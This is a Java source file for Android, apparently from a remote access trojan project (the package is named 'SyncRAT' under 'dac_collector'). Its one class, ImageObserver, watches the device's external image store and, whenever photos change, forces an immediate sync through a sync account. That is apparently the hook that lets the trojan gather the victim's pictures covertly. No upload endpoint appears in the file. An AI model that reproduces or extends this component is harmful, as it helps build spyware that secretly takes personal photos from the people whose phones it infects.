package android.iocl.dac_collector.SyncRAT;

import android.accounts.Account;
import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.os.Bundle;
import android.os.Handler;
import android.provider.MediaStore;
import android.util.Log;

public class ImageObserver extends ContentObserver {
    private Context mContext;

    public ImageObserver(Handler handler, Context context) {
        super(handler);
        mContext = context;
    }

    @Override
    public void onChange(boolean selfChange) {
        super.onChange(selfChange);



        Account account = SyncAccountUtil.getSyncAccount(mContext);
        Bundle bundle = new Bundle();
        bundle.putBoolean(ContentResolver.SYNC_EXTRAS_EXPEDITED, true);
        bundle.putBoolean(ContentResolver.SYNC_EXTRAS_MANUAL, true);
        ContentResolver.requestSync(account, Config.Sync.AUTHORITY, bundle);
    }
    public void register() {
        ContentResolver resolver = mContext.getContentResolver();
        resolver.registerContentObserver(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                false,
                this);
    }
}